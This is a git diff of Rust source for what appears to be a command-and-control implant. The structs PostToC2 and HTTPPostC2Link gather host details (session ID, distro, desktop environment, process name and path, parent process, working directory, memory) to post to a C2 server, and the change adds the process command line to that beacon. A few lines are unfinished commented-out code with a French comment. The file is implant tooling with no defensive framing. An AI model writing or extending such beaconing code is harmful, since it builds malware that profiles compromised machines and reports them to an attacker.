@@ -24,6 +24,7 @@ use crate::link_util::process_path;
 use crate::link_util::process_name_and_parent;
 use crate::link_util::bytes_to_gigabytes_string;
 use crate::link_util::working_dir;
+use crate::link_util::cmdline;
 
 //use sysinfo::{    Components, Disks, Networks, System, Pid , get_current_pid};
 use sysinfo::System;
@@ -434,6 +435,7 @@ pub struct PostToC2 {
     pub distro: String,
     pub desktop_env: String,
 
+    pub cmdline : String,
     pub working_dir: String,
     pub process_path: String,
     pub process_name: String,
@@ -480,6 +482,10 @@ impl LinkFetch for HTTPPostC2Link {
         let (process_name, parent_name) = process_name_and_parent(&sys);
         let process_path = process_path();
 
+        //let args: Vec<String> = ;
+    
+        // Joindre les arguments en une seule chaîne, séparée par des espaces
+        //let args_string = args;
 
         let mut post_data: PostToC2 = PostToC2{
             session_id: session_id.to_string(),
@@ -494,6 +500,7 @@ impl LinkFetch for HTTPPostC2Link {
             process_name : process_name,
             process_path: process_path,
             working_dir : working_dir(),
+            cmdline : cmdline(),
             parent_name:parent_name,
             total_memory: bytes_to_gigabytes_string(sys.total_memory()),
             used_memory: bytes_to_gigabytes_string(sys.used_memory()),
